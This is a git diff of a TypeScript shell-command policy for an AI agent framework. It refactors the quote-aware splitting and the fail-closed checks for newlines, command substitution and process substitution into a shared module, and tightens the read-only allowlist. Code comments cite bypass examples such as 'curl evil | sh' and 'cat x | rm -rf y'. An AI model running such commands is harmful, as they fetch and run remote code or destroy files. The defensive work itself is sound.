@@ -4,8 +4,8 @@
  *   1. 危险命令黑名单  — 即使 full 模式也阻止解释器/提权命令
  *   2. 环境变量前缀剥离 — `FOO=bar cmd` → 按 `cmd` 做白名单匹配
  *   3. Safe wrapper 剥离 — `timeout 10 cmd` → 按 `cmd` 做匹配
- *   4. 复合命令拆分   — `&&` `||` `;` 与管道 `|` 逐段独立检查，deny 优先
- *   5. Shell 语法 fail-closed — 非 full 模式拒绝含换行 / `$(...)` / 反引号的命令
+ *   4. 复合命令拆分   — `&&` `||` `;` 后台 `&` 与管道 `|` 逐段独立检查，deny 优先
+ *   5. Shell 语法 fail-closed — 非 full 模式拒绝含换行 / `$(...)` / 反引号 / 进程替换的命令
  *   6. 只读命令自动放行 — 与 file-policy classifyBashCommand 集成
  *   7. 审批信号 — ask/auto 返回待审批事实；具体决定由 ApprovalPort 完成
  */
@@ -13,8 +13,16 @@
 import type { AgentTool } from '@zhin.js/ai';
 import type { ZhinAgentConfig, ExecApprovalMode } from '../config/index.js';
 import { hasSensitiveExecCommand, isSensitiveExecSubcommand } from './sensitive-exec-commands.js';
-import { classifyBashCommand } from './file-policy.js';
+import { classifyBashCommand, findBashWriteOrExecRisk } from './file-policy.js';
 import { validateNetworkCommandUrl } from './network-policy.js';
+import {
+  extractCommandName,
+  findUnsafeShellSyntax,
+  splitCompoundCommand,
+  splitPipeSegments,
+  stripEnvVarPrefix,
+  stripSafeWrappers,
+} from './shell-syntax.js';
 import { getCurrentCommMessage, getCurrentOwnerApprovalRuntime } from './comm-message-context.js';
 import {
   ownerApprovalAddressFromMessage,
@@ -25,6 +33,7 @@ import {
 // ── 预设命令白名单 ──────────────────────────────────────────────────
 
 const PRESET_READONLY = ['ls', 'cat', 'pwd', 'date', 'whoami', 'grep', 'find', 'head', 'tail', 'wc', 'stat', 'file'];
+const READONLY_PRESET_COMMANDS: ReadonlySet<string> = new Set(PRESET_READONLY);
 const PRESET_NETWORK = [...PRESET_READONLY, 'curl', 'wget', 'ping', 'dig', 'nslookup', 'host'];
 const PRESET_DEVELOPMENT = [...PRESET_NETWORK, 'npm', 'npx', 'node', 'git', 'gh', 'python', 'python3', 'pip', 'pnpm', 'yarn', 'tsc', 'bun'];
 
@@ -74,327 +83,15 @@ export function matchHardBlockedCommand(command: string): string | undefined {
   return undefined;
 }
 
-// ── 环境变量前缀剥离──────────────
+export {
+  stripEnvVarPrefix,
+  stripSafeWrappers,
+  splitCompoundCommand,
+  splitPipeSegments,
+  findUnsafeShellSyntax,
+  extractCommandName,
+} from './shell-syntax.js';
 
-/**
- * 剥离命令前面的 `KEY=value` 环境变量前缀。
- * 例如 `FOO=bar BAZ=1 curl http://...` → `curl http://...`
- *
- * 只剥离安全的 key=value 对，不剥离含特殊字符的值（可能是注入）。
- */
-function tryStripOneEnvAssignment(command: string): { rest: string; stripped: boolean } {
-  const trimmed = command.trimStart();
-  const keyMatch = trimmed.match(/^([A-Za-z_][A-Za-z0-9_]*)=/);
-  if (!keyMatch) return { rest: command, stripped: false };
-  let i = keyMatch[0].length;
-  const ch = trimmed[i];
-  if (ch === "'") {
-    const end = trimmed.indexOf("'", i + 1);
-    if (end === -1) return { rest: command, stripped: false };
-    i = end + 1;
-  } else if (ch === '"') {
-    const end = trimmed.indexOf('"', i + 1);
-    if (end === -1) return { rest: command, stripped: false };
-    i = end + 1;
-  } else {
-    while (i < trimmed.length && !/[\s;|&]/.test(trimmed[i])) i++;
-  }
-  while (i < trimmed.length && /\s/.test(trimmed[i])) i++;
-  return { rest: trimmed.slice(i), stripped: true };
-}
-
-export function stripEnvVarPrefix(command: string): string {
-  let rest = command;
-  for (let n = 0; n < 32; n++) {
-    const next = tryStripOneEnvAssignment(rest);
-    if (!next.stripped) break;
-    rest = next.rest;
-  }
-  return rest.trim();
-}
-
-// ── Safe wrapper 剥离──────────────
-
-/**
- * Safe wrapper 命令列表 — 这些命令本身是安全的"包装器"，
- * 真正需要检查的是它们后面的实际命令。
- */
-const SAFE_WRAPPERS: ReadonlySet<string> = new Set([
-  'timeout', 'time', 'nice', 'nohup', 'ionice', 'stdbuf', 'unbuffer',
-]);
-
-/**
- * 剥离命令前面的 safe wrapper（如 `timeout 10`、`nice -n 5`）。
- * 只剥离 wrapper + 它的标志/参数（数字、-flag 形式），直到遇到实际命令。
- */
-export function stripSafeWrappers(command: string): string {
-  let remaining = command.trim();
-  let changed = true;
-  // 防止无限循环，最多剥离 5 层
-  let maxIter = 5;
-  while (changed && maxIter-- > 0) {
-    changed = false;
-    const tokens = remaining.split(/\s+/);
-    if (tokens.length < 2) break;
-    if (SAFE_WRAPPERS.has(tokens[0])) {
-      // 跳过 wrapper 本身和它的参数（-flag 或纯数字/duration）
-      let i = 1;
-      while (i < tokens.length && /^(-[A-Za-z0-9]|[0-9]+[smhd]?$)/.test(tokens[i])) {
-        i++;
-      }
-      if (i < tokens.length) {
-        remaining = tokens.slice(i).join(' ');
-        changed = true;
-      }
-    }
-  }
-  return remaining;
-}
-
-// ── 复合命令拆分──────────────
-
-/**
- * 将复合命令按 `&&`, `||`, `;` 拆分为独立子命令。
- * 管道 `|` 不在此拆分 — 由 checkExecPolicy 再用 splitPipeSegments 逐段检查。
- *
- * 引号/转义感知：单引号内为字面量；双引号与裸文本内 `\` 转义下一个字符；
- * 引号内的分隔符不拆分（`echo "a && b"` 是单命令）。
- * 引号未闭合时 fail-closed：整条按单命令返回（不拆分），
- * 避免把藏在残缺引号后的危险段漏检。
- *
- * 注意：不处理换行、subshell `$(...)` 和反引号 — 这些语法超出策略理解范围，
- * 由 checkExecPolicy 在非 full 模式下直接 fail-closed 拒绝（见 findUnsafeShellSyntax）。
- */
-export function splitCompoundCommand(command: string): string[] {
-  const parts: string[] = [];
-  let current = '';
-  let quote: 'single' | 'double' | null = null;
-  let escaped = false;
-  let i = 0;
-  while (i < command.length) {
-    const ch = command[i]!;
-    if (escaped) {
-      current += ch;
-      escaped = false;
-      i++;
-      continue;
-    }
-    // 单引号内没有转义；双引号/裸文本内 \ 转义下一字符
-    if (ch === '\\' && quote !== 'single') {
-      current += ch;
-      escaped = true;
-      i++;
-      continue;
-    }
-    if (quote === 'single') {
-      if (ch === "'") quote = null;
-      current += ch;
-      i++;
-      continue;
-    }
-    if (quote === 'double') {
-      if (ch === '"') quote = null;
-      current += ch;
-      i++;
-      continue;
-    }
-    if (ch === "'") {
-      quote = 'single';
-      current += ch;
-      i++;
-      continue;
-    }
-    if (ch === '"') {
-      quote = 'double';
-      current += ch;
-      i++;
-      continue;
-    }
-    if (command.startsWith('&&', i) || command.startsWith('||', i) || ch === ';') {
-      const trimmed = current.trim();
-      if (trimmed) parts.push(trimmed);
-      current = '';
-      if (command.startsWith('&&', i)) i += 2;
-      else if (command.startsWith('||', i)) i += 2;
-      else i += 1;
-      while (i < command.length && /\s/.test(command[i])) i++;
-      continue;
-    }
-    current += ch;
-    i++;
-  }
-  if (quote !== null || escaped) return [command];
-  const tail = current.trim();
-  if (tail) parts.push(tail);
-  return parts;
-}
-
-/**
- * 将命令按管道 `|` 拆分为独立段（`||` 不拆）。
- * 引号/转义感知规则与 splitCompoundCommand 一致；引号未闭合时 fail-closed 返回整条。
- *
- * 用于逐段过白名单 — 防止 `cat x | rm -rf y`、`curl evil | sh`
- * 这类以首命令命中白名单/只读预设的绕过。
- */
-export function splitPipeSegments(command: string): string[] {
-  const parts: string[] = [];
-  let current = '';
-  let quote: 'single' | 'double' | null = null;
-  let escaped = false;
-  let i = 0;
-  while (i < command.length) {
-    const ch = command[i]!;
-    if (escaped) {
-      current += ch;
-      escaped = false;
-      i++;
-      continue;
-    }
-    if (ch === '\\' && quote !== 'single') {
-      current += ch;
-      escaped = true;
-      i++;
-      continue;
-    }
-    if (quote === 'single') {
-      if (ch === "'") quote = null;
-      current += ch;
-      i++;
-      continue;
-    }
-    if (quote === 'double') {
-      if (ch === '"') quote = null;
-      current += ch;
-      i++;
-      continue;
-    }
-    if (ch === "'") {
-      quote = 'single';
-      current += ch;
-      i++;
-      continue;
-    }
-    if (ch === '"') {
-      quote = 'double';
-      current += ch;
-      i++;
-      continue;
-    }
-    if (ch === '|' && command[i + 1] !== '|' && command[i - 1] !== '|') {
-      const trimmed = current.trim();
-      if (trimmed) parts.push(trimmed);
-      current = '';
-      i++;
-      while (i < command.length && /\s/.test(command[i])) i++;
-      continue;
-    }
-    current += ch;
-    i++;
-  }
-  if (quote !== null || escaped) return [command];
-  const tail = current.trim();
-  if (tail) parts.push(tail);
-  return parts;
-}
-
-/**
- * 检测超出策略理解范围的 shell 语法，返回拒绝原因（安全则返回 undefined）。
- *
- * fail-closed 场景：
- *  - 未加引号的换行 — `\n` 是命令分隔符，朴素分词会把 `cat a.txt\nrm -rf x` 整条当 cat
- *  - 命令替换 `$(...)` 与反引号 — 可在任意参数位置藏入任意命令
- *
- * 单引号内为字面量，不判定；双引号内 `$(...)` / 反引号在 bash 中仍会展开，照样拒绝。
- */
-export function findUnsafeShellSyntax(command: string): string | undefined {
-  let quote: 'single' | 'double' | null = null;
-  let escaped = false;
-  for (let i = 0; i < command.length; i++) {
-    const ch = command[i]!;
-    if (escaped) {
-      escaped = false;
-      continue;
-    }
-    if (ch === '\\' && quote !== 'single') {
-      escaped = true;
-      continue;
-    }
-    if (quote === 'single') {
-      if (ch === "'") quote = null;
-      continue;
-    }
-    if (ch === "'") {
-      quote = 'single';
-      continue;
-    }
-    if (quote === 'double') {
-      if (ch === '"') quote = null;
-      // 双引号内换行是字面量；`$(` 与反引号仍会展开，落到下方统一判定
-    } else {
-      if (ch === '"') {
-        quote = 'double';
-        continue;
-      }
-      // 裸文本中的换行是命令分隔符 — 策略无法逐行理解，fail-closed
-      if (ch === '\n' || ch === '\r') {
-        return '拒绝执行含换行的命令 — 换行可夹带额外命令，超出安全策略的理解范围。请拆分为单条命令逐次执行。';
-      }
-    }
-    if (ch === '`') {
-      return '拒绝执行含反引号命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
-    }
-    if (ch === '$' && command[i + 1] === '(') {
-      return '拒绝执行含 $(...) 命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
-    }
-  }
-  return undefined;
-}
-
-/**
- * 从命令字符串中提取实际的可执行程序名。
- * 先剥离环境变量前缀和 safe wrapper，再对首 token 去引号/转义，
- * 防止 `"rm"`、`'rm'`、`r\m` 这类引号变体绕过黑名单精确匹配。
- */
-export function extractCommandName(command: string): string {
-  const stripped = stripSafeWrappers(stripEnvVarPrefix(command));
-  // 取第一个非管道 token
-  const name = stripped.split(/[\s|]/)[0] || '';
-  return unquoteToken(name);
-}
-
-/** 去除 token 外层的引号与转义（POSIX 风格：单引号字面、双引号内 \\ 仅转义 " \ $ `）。 */
-function unquoteToken(token: string): string {
-  let out = '';
-  let quote: 'single' | 'double' | null = null;
-  for (let i = 0; i < token.length; i++) {
-    const ch = token[i]!;
-    if (quote === 'single') {
-      if (ch === "'") quote = null;
-      else out += ch;
-      continue;
-    }
-    if (quote === 'double') {
-      if (ch === '"') quote = null;
-      else if (ch === '\\' && i + 1 < token.length && '"\\$`'.includes(token[i + 1]!)) out += token[++i];
-      else out += ch;
-      continue;
-    }
-    if (ch === "'") {
-      quote = 'single';
-      continue;
-    }
-    if (ch === '"') {
-      quote = 'double';
-      continue;
-    }
-    if (ch === '\\' && i + 1 < token.length) {
-      out += token[++i];
-      continue;
-    }
-    out += ch;
-  }
-  return out;
-}
 
 // ── 策略检查结果 ────────────────────────────────────────────────────
 
@@ -538,7 +235,7 @@ function checkSingleCommand(
   }
 
   // 4. 白名单匹配
-  const allowed = allowlist.some(pattern => {
+  const allowlisted = allowlist.some(pattern => {
     try {
       // Group the pattern: `^git|npm$` would otherwise match any command starting with `git`.
       const re = new RegExp(`^(?:${pattern})$`);
@@ -547,6 +244,11 @@ function checkSingleCommand(
       return cmdName === pattern;
     }
   });
+
+  // Read-only preset commands are allowlisted for reading only: a redirection, a write/exec flag
+  // (`find -delete`) or an env override must still go through the requester/approval path.
+  const allowed = allowlisted
+    && !(READONLY_PRESET_COMMANDS.has(cmdName) && findBashWriteOrExecRisk(fullSubCommand) !== undefined);
 
   if (allowed) {
     // curl/wget 白名单放行时，额外校验 URL（SSRF 防护 + 数据外泄阻断）
